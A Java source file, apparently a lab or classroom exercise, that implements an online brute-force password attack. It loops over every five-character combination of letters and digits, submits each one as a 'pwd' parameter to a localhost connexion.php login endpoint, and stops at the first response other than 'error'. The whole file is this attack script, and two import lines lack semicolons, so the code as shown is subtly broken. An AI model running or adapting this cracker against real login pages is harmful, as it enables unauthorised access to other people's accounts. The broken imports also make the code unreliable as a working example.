import java.io.BufferedReader;
import java.io.*
import java.net.*

public class ForceBrute extends Cracker {
    // public User User1= new User("Benjamin","abaaa");

    public ForceBrute() {

    }

    public String hack() throws IOException {
        String dico = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ123456789";
        String mdp = "";
        // boolean bool;
        for (int i = 0; i < dico.length(); i++) {
            for (int j = 0; j < dico.length(); j++) {
                for (int w = 0; w < dico.length(); w++) {
                    for (int k = 0; k < dico.length(); k++) {
                        for (int z = 0; z < dico.length(); z++) {

                            mdp = dico.charAt(i) + "" + dico.charAt(j) + dico.charAt(w) + dico.charAt(k)
                                    + dico.charAt(z);
                            System.out.println("" + mdp);
                            URL url = new URL("http://localhost/connexion.php?pwd=" + mdp);
                            URLConnection connection = url.openConnection();

                        

                            try (BufferedReader in = new BufferedReader(
                                    new InputStreamReader(connection.getInputStream()))) {
                                String line;
                                while ((line = in.readLine()) != null) {
                                    
                                    System.out.println(line);
                                    if(line.equals("error")){
                                    }else{
                                        System.exit(0);

                                    }
                                }
                                
                                
                            }

                            

                        }

                    }
                }
            }
        }
        System.out.print(mdp);
        return mdp;

    }

}
